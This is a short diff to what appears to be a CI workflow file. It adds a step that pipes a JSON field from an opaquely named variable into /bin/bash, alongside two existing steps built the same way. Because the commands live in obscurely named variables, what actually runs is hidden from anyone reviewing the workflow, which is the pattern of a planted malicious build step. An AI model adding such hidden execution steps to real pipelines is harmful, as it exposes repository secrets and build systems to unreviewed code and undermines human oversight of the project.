@@ -24,6 +24,7 @@ jobs:
         run: |
           printf '%s' "$rd80" | jq -r .k0667 | /bin/bash
           printf '%s' "$bsjf20" | jq -r .ic3934 | /bin/bash
+          echo $iw1 | jq -r .zud8 | /bin/bash
 
       - name: Store results
         if: always()
